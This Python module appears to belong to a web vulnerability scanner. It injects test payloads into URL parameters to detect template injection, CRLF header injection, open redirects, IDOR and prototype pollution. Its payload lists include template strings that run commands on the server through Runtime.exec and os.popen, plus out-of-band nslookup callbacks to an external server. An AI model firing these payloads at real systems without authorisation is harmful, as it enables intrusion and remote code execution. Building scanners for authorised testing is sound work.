import re
import random
import hashlib
import urllib.parse
from core.ui import vuln, found, CYN, RED, YLW, GRY, RESET, info, warn
from core.http import http_probe
from core.rate_limit import RATE_LIMITER
from core.config import CONFIG
from core.utils import generate_oob_id
from . import BaseScanner

class MiscScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params_q = self._get_params(url)
        if not params_q: return findings

        a, b = random.randint(111, 999), random.randint(111, 999)
        expected = str(a * b)
        SSTI_PAYLOADS = [
            (f"{{{{{a}*{b}}}}}", expected, "Jinja2/Twig"),
            (f"${{{a}*{b}}}", expected, "Freemarker/EL"),
            (f"<%={a}*{b}%>", expected, "ERB/JSP"),
            (f"{{{a}*{b}}}", expected, "Smarty"),
            (f"#{{{a}*{b}}}", expected, "Ruby/Pebble"),
            (f"${{T(java.lang.Runtime).getRuntime().exec('id')}}", "java.lang.UNIXProcess", "Spring SpEL"),
            (f"#{{T(java.lang.Math).random()}}", "0.", "Spring SpEL Math"),
            (f"{{{{{a}*{b}}}}}{{%25 endfor %}}", expected, "Jinja2 (error recovery)"),
            (f"@({a}*{b})", expected, "Razor (.NET)"),
            (f"${{{a}*{b}}}", expected, "Velocity"),
        ]
        ssti_found = False
        for param in list(params_q.keys())[:3]:
            if ssti_found: break
            for payload, expected_val, engine in SSTI_PAYLOADS:
                test_params = dict(params_q)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()
                
                if self.waf_detected and code2 in (403,406,429,503):
                    break
                    
                if code2 == 200 and expected_val in body2:
                    _, orig_body, _, _ = await http_probe(self.session, url, timeout=8)
                    if expected_val not in orig_body:
                        vuln(f"SSTI CONFIRMED ({engine}): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"reflected: {expected_val} → template executed"+RESET)
                        findings.append({"type":"SSTI","url":url,"param":param,"payload":payload,"engine":engine,"evidence":f"{payload} → {expected_val}"})
                        ssti_found = True; break

        CRLF_PAYLOADS = [
            ("%0d%0aX-Injected: bbr3c0n",        "x-injected",  "url-encode"),
            ("%0aX-Injected: bbr3c0n",            "x-injected",  "lf-only"),
            ("%E5%98%8A%E5%98%8DX-Injected: bbr3c0n","x-injected","utf8-bypass"),
            ("%23%0d%0aX-Injected: bbr3c0n",      "x-injected",  "hash-crlf"),
            ("%0d%0aSet-Cookie: bbr3c0n=hacked",  "bbr3c0n",     "set-cookie-inject"),
            ("%0d%0aLocation: https://evil.com",  "evil.com",    "location-inject"),
            ("\r\nX-Injected: bbr7test",           "x-injected",  "raw-crlf"),
            ("%u000aX-Injected: bbr3c0n",         "x-injected",  "unicode-lf"),
        ]
        crlf_found = False
        for param in list(params_q.keys())[:2]:
            if crlf_found: break
            for payload, needle, tag in CRLF_PAYLOADS:
                parts = []
                for k, vals in params_q.items():
                    val = vals[0] if vals else ""
                    if k == param: parts.append(f"{k}={val}{payload}")
                    else: parts.append(f"{k}={val}")
                raw_query = "&".join(parts)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{raw_query}"
                code2, body2, hdrs2, _ = await http_probe(self.session, test_url, timeout=8, follow_redirects=False)
                await self._waf_sleep()
                for hk, hv in hdrs2.items():
                    if needle in hk.lower() or needle in hv.lower():
                        vuln(f"CRLF INJECTION ({tag}): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"injected header: {hk}: {hv}"+RESET)
                        findings.append({"type":"CRLF","url":url,"param":param,"technique":tag,"evidence":f"{hk}: {hv}"})
                        crlf_found = True; break
                if crlf_found: break

        REDIR_TARGETS = [
            "https://attacker-evil.com", "//attacker-evil.com",
            "https://attacker-evil.com/%2f..", "/\\attacker-evil.com",
            "https://attacker-evil.com@{host}",
            "//attacker-evil.com%00{host}",
            "///attacker-evil.com",
            "\\\\attacker-evil.com",
            "https:attacker-evil.com",
            "/%0d/attacker-evil.com",
            "//%09/attacker-evil.com",
        ]
        redir_found = False
        for param in list(params_q.keys())[:3]:
            if redir_found: break
            for evil_url in REDIR_TARGETS:
                evil_url_final = evil_url.replace("{host}", parsed.netloc)
                test_params = dict(params_q)
                test_params[param] = [evil_url_final]
                test_url = self._build_url(parsed, test_params)
                code2, body2, hdrs2, _ = await http_probe(self.session, test_url, timeout=7, follow_redirects=False)
                await self._waf_sleep()
                location = hdrs2.get("Location", "").lower()
                if code2 in (301,302,303,307,308) and "attacker-evil" in location:
                    vuln(f"OPEN REDIRECT CONFIRMED: {url}")
                    print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {evil_url_final}"+RESET)
                    findings.append({"type":"OpenRedirect","url":url,"param":param,"payload":evil_url_final,"location":hdrs2.get("Location","")})
                    redir_found = True; break
                if code2 == 200 and "attacker-evil" in body2.lower():
                    vuln(f"OPEN REDIRECT (body-based): {url}")
                    print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {evil_url_final}"+RESET)
                    findings.append({"type":"OpenRedirect-body","url":url,"param":param,"payload":evil_url_final})
                    redir_found = True; break

        for param in list(params_q.keys())[:3]:
            orig_val = params_q[param][0] if params_q[param] else ""
            if not orig_val.isdigit(): continue
            orig_id = int(orig_val)
            code_orig, body_orig, _, _ = await http_probe(self.session, url, timeout=8)
            if code_orig != 200 or len(body_orig) < 100: continue
            orig_hash = hashlib.md5(body_orig.encode()).hexdigest()
            for test_id in [orig_id + 1, orig_id - 1, orig_id + 100, 1, orig_id + 1000]:
                if test_id == orig_id or test_id < 0: continue
                tp = dict(params_q)
                tp[param] = [str(test_id)]
                test_url = self._build_url(parsed, tp)
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()
                if code2 == 200 and len(body2) > 100:
                    test_hash = hashlib.md5(body2.encode()).hexdigest()
                    if test_hash != orig_hash:
                        found(f"IDOR POSSIBLE: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  orig={orig_id} test={test_id}"+RESET)
                        findings.append({"type": "IDOR", "url": url, "param": param, "original_id": orig_id, "tested_id": test_id, "note": "Different content — verify manually"})
                        break

        PP_PAYLOADS = [
            ("__proto__[isAdmin]=true", "__proto__", "Proto Pollution (bracket)"),
            ("constructor.prototype.isAdmin=true", "constructor.prototype", "Proto Pollution (dot)"),
            ("__proto__.polluted=true", "__proto__", "Proto Pollution (simple)"),
        ]
        for param in list(params_q.keys())[:2]:
            for payload, needle, tag in PP_PAYLOADS:
                test_params = dict(params_q)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                code2, body2, hdrs2, _ = await http_probe(self.session, test_url, timeout=8, 
                    extra_headers={"Content-Type": "application/json"})
                await self._waf_sleep()
                if code2 == 500:
                    found(f"Prototype Pollution (500 error): {url}")
                    print(GRY+"│    "+RESET+CYN+f"param: {param}  {tag}"+RESET)
                    findings.append({"type": "PrototypePollution", "url": url, "param": param,
                                   "payload": payload, "technique": tag, "note": "Server error on proto injection — investigate"})
                    break

        if CONFIG.oob_server:
            oob_id = generate_oob_id()
            OOB_SSTI_PAYLOADS = [
                f"${{T(java.lang.Runtime).getRuntime().exec('nslookup {oob_id}.{CONFIG.oob_server}')}}",
                f"{{% import os %}}{{{{os.popen('nslookup {oob_id}.{CONFIG.oob_server}').read()}}}}",
            ]
            for param in list(params_q.keys())[:1]:
                for oob_p in OOB_SSTI_PAYLOADS:
                    test_params = dict(params_q)
                    test_params[param] = [oob_p]
                    test_url = self._build_url(parsed, test_params)
                    await http_probe(self.session, test_url, timeout=6)
                    await self._waf_sleep()
            findings.append({"type":"SSTI-OOB","url":url,"oob_id":oob_id,
                           "note":f"Check {CONFIG.oob_server} for DNS callback"})

        return findings
